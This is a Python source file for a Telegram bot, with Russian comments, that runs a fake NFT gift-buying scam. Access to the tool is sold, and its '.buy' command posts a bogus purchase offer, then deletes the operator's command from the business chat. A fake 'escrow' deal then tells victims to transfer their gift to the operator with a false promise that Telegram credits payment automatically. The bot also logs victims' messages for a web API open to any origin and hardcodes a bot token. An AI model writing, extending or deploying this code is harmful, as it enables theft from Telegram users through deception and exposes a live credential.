import asyncio
import logging
import re
import os
import sqlite3
import json
from datetime import datetime
from aiogram import Bot, Dispatcher, F
from aiogram.types import (
    Message, CallbackQuery, InlineKeyboardMarkup, InlineKeyboardButton, BusinessConnection
)
from aiogram.methods import DeleteBusinessMessages

# --- ВЕБ СЕРВЕР ---
from fastapi import FastAPI
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel
import uvicorn

# ==== НАСТРОЙКИ ====
BOT_TOKEN = "8801855881:AAFiRYHormrea0F0WPwszgiIH0eylSf_BkU"
ADMIN_ID = 8747920918
DB_NAME = "bot_data.db"

# ==== ID ЭМОДЗИ ====
EMOJI_CHECK = "5776375003280838798"
EMOJI_CROSS = "5778527486270770928"
EMOJI_GIFT  = "6032937473162614352"
EMOJI_TON   = "5318901904686754959"
EMOJI_STAR  = "5406812184359507637"
EMOJI_RUB   = "5208433275659378741"

# ==== БАЗА ДАННЫХ ====
def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, status TEXT, added_time TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS logs (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, action TEXT, time TEXT)''')
    c.execute('''CREATE TABLE IF NOT EXISTS chats (id INTEGER PRIMARY KEY AUTOINCREMENT, user_id INTEGER, username TEXT, text TEXT, is_admin INTEGER, time TEXT)''')
    conn.commit()
    conn.close()

init_db()

def add_log(user_id, username, action):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO logs (user_id, username, action, time) VALUES (?, ?, ?, ?)",
              (user_id, username, action, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
    conn.commit()
    conn.close()

def add_chat_msg(user_id, username, text, is_admin=0):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("INSERT INTO chats (user_id, username, text, is_admin, time) VALUES (?, ?, ?, ?, ?)",
              (user_id, username, text, is_admin, datetime.now().strftime("%H:%M")))
    conn.commit()
    conn.close()

def check_access(user_id):
    if user_id == ADMIN_ID: return True
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT status FROM users WHERE id = ?", (user_id,))
    res = c.fetchone()
    conn.close()
    return res and res[0] == "allowed"

# ==== БОТ ====
logging.basicConfig(level=logging.INFO)
bot = Bot(token=BOT_TOKEN)
dp = Dispatcher()
orders = {}

LANGS = {
    "ru": {
        "offer_header": "Пользователь предлагает вам", "for_gift": "за подарок",
        "valid": "Предложение действует ещё", "accept": "Принять", "decline": "Отклонить",
        "deal_header": "NFT Deal", "order": "Ордер", "reserved": "Покупатель зарезервировал",
        "via_escrow": "через эскроу.", "instruction": "Инструкция:",
        "step1": "1. Нажмите Передать NFT", "step2": "2. Передайте подарок:",
        "step3": "3. Подтвердите.", "will_credit": "Telegram зачислит", "to_balance": "на баланс.",
        "gift_label": "Подарок:", "transfer_gift": "Передать подарок",
        "confirm_transfer": "Подтвердить передачу", "declined": "Вы отклонили.",
        "confirm_order": "Завершите передачу NFT.", "auto_credit": "Средства зачислятся автоматически.",
    },
    "en": {
        "offer_header": "User offers", "for_gift": "for gift", "valid": "Valid for",
        "accept": "Accept", "decline": "Decline", "deal_header": "NFT Deal", "order": "Order",
        "reserved": "Buyer reserved", "via_escrow": "via escrow.", "instruction": "Instruction:",
        "step1": "1. Click Transfer", "step2": "2. Transfer gift:", "step3": "3. Confirm.",
        "will_credit": "Will credit", "to_balance": "to balance.", "gift_label": "Gift:",
        "transfer_gift": "Transfer gift", "confirm_transfer": "Confirm transfer",
        "declined": "Declined.", "confirm_order": "Complete NFT transfer.",
        "auto_credit": "Funds credited automatically.",
    }
}

def t(lang, key): return LANGS.get(lang, LANGS["ru"]).get(key, key)

def make_button(text, **kwargs):
    emoji_id = kwargs.pop("emoji_id", "")
    if emoji_id: return InlineKeyboardButton(text=text, icon_custom_emoji_id=emoji_id, **kwargs)
    return InlineKeyboardButton(text=text, **kwargs)

def main_menu(order_id, lang, sender_username):
    return InlineKeyboardMarkup(inline_keyboard=[
        [make_button(t(lang, "transfer_gift"), url=f"tg://send_gift?to={sender_username}", emoji_id=EMOJI_GIFT)],
        [make_button(t(lang, "confirm_transfer"), callback_data=f"confirm|{order_id}|{lang}|{sender_username}", emoji_id=EMOJI_CHECK)]
    ])

def accept_menu(order_id, lang, message_id, business_conn_id="", sender_username=""):
    cb_data = f"accept|{order_id}|{lang}|{message_id}|{business_conn_id}|{sender_username}"
    return InlineKeyboardMarkup(inline_keyboard=[
        [make_button(t(lang, "accept"), callback_data=cb_data, emoji_id=EMOJI_CHECK)],
        [make_button(t(lang, "decline"), callback_data=f"decline|{lang}", emoji_id=EMOJI_CROSS)]
    ])

def currency_html(currency):
    c = currency.lower()
    if c == "stars": return f'<tg-emoji emoji-id="{EMOJI_STAR}">⭐</tg-emoji>'
    if c in ("gram", "ton"): return f'<tg-emoji emoji-id="{EMOJI_TON}">💎</tg-emoji>'
    if c in ("rub", "ruble", "руб"): return f'<tg-emoji emoji-id="{EMOJI_RUB}">₽</tg-emoji>'
    return currency

def parse_nft(nft_link):
    m = re.search(r"/nft/([A-Za-z]+)-(\d+)", nft_link)
    if m:
        name = m.group(1); number = m.group(2)
        return re.sub(r"(?<!^)(?=[A-Z])", " ", name), number
    return "NFT", "?"

def create_offer(nft_link, amount, currency, lang):
    name, number = parse_nft(nft_link)
    return (f'<tg-emoji emoji-id="{EMOJI_GIFT}">🎁</tg-emoji> <b>{t(lang, "offer_header")}</b>\n'
            f'{amount} {currency_html(currency)} {t(lang, "for_gift")} <a href="{nft_link}">{name} #{number}</a>.\n\n'
            f'{t(lang, "valid")} <b>5 ч. 59 мин.</b>')

def create_deal_text(order_id, nft_link, amount, currency, lang, sender_username):
    name, number = parse_nft(nft_link)
    return (f'<tg-emoji emoji-id="{EMOJI_GIFT}">🎁</tg-emoji> <b>{t(lang, "deal_header")}</b>\n\n'
            f'{t(lang, "order")} <b>#{order_id}</b>\n\n'
            f'{t(lang, "reserved")} {amount} {currency_html(currency)} {t(lang, "via_escrow")}\n\n'
            f'<b>{t(lang, "instruction")}</b>\n{t(lang, "step1")}\n{t(lang, "step2")} @{sender_username}\n{t(lang, "step3")}\n\n'
            f'{t(lang, "will_credit")} {amount} {currency_html(currency)} {t(lang, "to_balance")}\n\n'
            f'{t(lang, "gift_label")} <a href="{nft_link}">{name} #{number}</a>')

# ==== ОБРАБОТЧИКИ БОТА ====

@dp.message(F.text.startswith("/d "))
async def cmd_grant_access(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        target = message.text.replace("/d ", "").strip().replace("@", "")
        if target.isdigit(): user_id = int(target)
        else:
            user = await bot.get_chat(f"@{target}"); user_id = user.id
        
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("INSERT OR REPLACE INTO users (id, status, added_time) VALUES (?, 'allowed', ?)", 
                  (user_id, datetime.now().strftime("%Y-%m-%d %H:%M:%S")))
        conn.commit(); conn.close()
        add_log(message.from_user.id, message.from_user.username or "Admin", f"Выдал доступ ID {user_id}")
        
        try:
            await bot.send_message(user_id, "✅ Доступ открыт!")
            await message.reply(f"✅ Доступ выдан (ID: {user_id})")
        except:
            await message.reply(f"✅ Доступ выдан (ID: {user_id}), но уведомление не отправлено.")
    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")

# === НОВАЯ КОМАНДА /y (УДАЛИТЬ ДОСТУП) ===
@dp.message(F.text.startswith("/y "))
async def cmd_revoke_access(message: Message):
    if message.from_user.id != ADMIN_ID: return
    try:
        target = message.text.replace("/y ", "").strip().replace("@", "")
        if target.isdigit(): user_id = int(target)
        else:
            user = await bot.get_chat(f"@{target}"); user_id = user.id
        
        conn = sqlite3.connect(DB_NAME)
        c = conn.cursor()
        c.execute("DELETE FROM users WHERE id = ?", (user_id,))
        conn.commit(); conn.close()
        
        add_log(message.from_user.id, message.from_user.username or "Admin", f"Забрал доступ у ID {user_id}")
        await message.reply(f"✅ Доступ забран у пользователя (ID: {user_id})")
        
        try:
            await bot.send_message(user_id, "❌ Ваш доступ к офферам был закрыт администратором.")
        except:
            pass
            
    except Exception as e:
        await message.reply(f"❌ Ошибка: {e}")

@dp.business_message()
async def on_business_message(message: Message):
    if message.text:
        add_chat_msg(message.from_user.id, message.from_user.username or "нет", message.text, is_admin=0)
    
    if message.text and message.text.startswith(".buy"):
        add_log(message.from_user.id, message.from_user.username or "нет", "Попытка .buy (Business)")
        if not check_access(message.from_user.id):
            add_log(message.from_user.id, message.from_user.username or "нет", "БЛОК: нет доступа")
            lock_text = "⛔️ <b>Доступ закрыт</b>\n\nКупите доступ у @tokarevrich"
            await bot.send_message(chat_id=message.from_user.id, text=lock_text, parse_mode="HTML")
            return
        
        parts = message.text.split()
        if len(parts) < 5: return

        nft_link = parts[1]; amount = parts[2]; currency = parts[3]; lang = parts[4].lower()
        if lang not in LANGS: lang = "ru"

        sender = message.from_user.username or "gift_recovery"

        order_id = f"TG-{message.message_id:08X}"
        orders[order_id] = {"nft_link": nft_link, "amount": amount, "currency": currency, "lang": lang, "sender": sender}

        try:
            await bot(DeleteBusinessMessages(business_connection_id=message.business_connection_id, message_ids=[message.message_id]))
        except: pass

        text = create_offer(nft_link, amount, currency, lang)
        try:
            await bot.send_message(
                chat_id=message.chat.id, text=text,
                reply_markup=accept_menu(order_id, lang, message.message_id, message.business_connection_id, sender),
                parse_mode="HTML", disable_web_page_preview=False,
                business_connection_id=message.business_connection_id
            )
        except: pass

@dp.message(F.text.startswith(".buy"))
async def cmd_buy(message: Message):
    add_log(message.from_user.id, message.from_user.username or "нет", "Попытка .buy (Личка)")
    if not check_access(message.from_user.id):
        add_log(message.from_user.id, message.from_user.username or "нет", "БЛОК: нет доступа")
        await bot.send_message(chat_id=message.from_user.id, text="⛔️ Доступ закрыт.", parse_mode="HTML")
        return

    parts = message.text.split()
    if len(parts) < 5: return

    nft_link = parts[1]; amount = parts[2]; currency = parts[3]; lang = parts[4].lower()
    if lang not in LANGS: lang = "ru"

    sender = message.from_user.username or "gift_recovery"

    order_id = f"TG-{message.message_id:08X}"
    orders[order_id] = {"nft_link": nft_link, "amount": amount, "currency": currency, "lang": lang, "sender": sender}

    text = create_offer(nft_link, amount, currency, lang)
    await message.answer(text, reply_markup=accept_menu(order_id, lang, message.message_id, "", sender), parse_mode="HTML", disable_web_page_preview=False)

@dp.message(F.text)
async def on_private_message(message: Message):
    if message.text.startswith(".buy"): return
    if message.from_user.id != ADMIN_ID:
        add_chat_msg(message.from_user.id, message.from_user.username or "нет", message.text, is_admin=0)

@dp.callback_query(F.data.startswith("accept|"))
async def on_accept(callback: CallbackQuery):
    add_log(callback.from_user.id, callback.from_user.username or "нет", "Нажал Принять")
    await callback.answer()

    parts = callback.data.split("|")
    order_id = parts[1]
    lang = parts[2] if len(parts) > 2 else "ru"
    sender = parts[5] if len(parts) > 5 else "gift_recovery"
    
    order = orders.get(order_id, {})
    text = create_deal_text(order_id, order.get("nft_link", ""), order.get("amount", "1"), order.get("currency", "stars"), lang, sender)
    
    try:
        await callback.message.edit_text(
            text, 
            reply_markup=main_menu(order_id, lang, sender), 
            parse_mode="HTML", 
            disable_web_page_preview=False
        )
    except: pass

@dp.callback_query(F.data.startswith("decline|"))
async def on_decline(callback: CallbackQuery):
    parts = callback.data.split("|")
    lang = parts[1] if len(parts) > 1 else "ru"
    text = f'<tg-emoji emoji-id="{EMOJI_CROSS}">❌</tg-emoji> {t(lang, "declined")}'
    await callback.message.edit_text(text, parse_mode="HTML")

@dp.callback_query(F.data.startswith("confirm|"))
async def on_confirm(callback: CallbackQuery):
    parts = callback.data.split("|")
    order_id = parts[1]; lang = parts[2] if len(parts) > 2 else "ru"
    sender = parts[3] if len(parts) > 3 else "gift_recovery"
    
    order = orders.get(order_id, {})
    amount = order.get("amount", "1"); currency = order.get("currency", "stars"); nft_link = order.get("nft_link", "")
    name, number = parse_nft(nft_link)
    
    text = (f'<tg-emoji emoji-id="{EMOJI_GIFT}">🎁</tg-emoji> <b>#{order_id}</b>\n\n'
            f'{t(lang, "confirm_order")}\n\n{t(lang, "auto_credit")}\n\n{t(lang, "gift_label")} {name} #{number}')
    
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [make_button(t(lang, "confirm_transfer"), url=f"https://t.me/{sender}", emoji_id=EMOJI_CHECK)]
    ])
    await callback.message.edit_text(text, reply_markup=kb, parse_mode="HTML")

# ================= ВЕБ-СЕРВЕР =================
app = FastAPI()
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

class ReplyModel(BaseModel):
    user_id: int
    text: str

@app.get("/api/chats_list")
def get_chats_list():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT user_id, username, MAX(time) as last_time FROM chats GROUP BY user_id ORDER BY last_time DESC")
    chats = [{"user_id": r[0], "username": r[1], "last_time": r[2]} for r in c.fetchall()]
    conn.close()
    return chats

@app.get("/api/chat_history/{user_id}")
def get_chat_history(user_id: int):
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("SELECT username, text, is_admin, time FROM chats WHERE user_id = ? ORDER BY id ASC", (user_id,))
    msgs = [{"username": r[0], "text": r[1], "is_admin": r[2], "time": r[3]} for r in c.fetchall()]
    conn.close()
    return msgs

@app.post("/api/send_reply")
async def send_reply(data: ReplyModel):
    try:
        await bot.send_message(data.user_id, data.text)
        add_chat_msg(data.user_id, "Admin", data.text, is_admin=1)
        return {"status": "ok"}
    except Exception as e:
        return {"status": "error", "message": str(e)}

async def run_web():
    config = uvicorn.Config(app, host="127.0.0.1", port=8000, log_level="warning")
    server = uvicorn.Server(config)
    await server.serve()

async def main():
    print(">>> БОТ И СЕРВЕР ЗАПУЩЕНЫ! НЕ ЗАКРЫВАЙ ЭТО ОКНО.")
    await asyncio.gather(dp.start_polling(bot), run_web())

if __name__ == "__main__":
    asyncio.run(main())
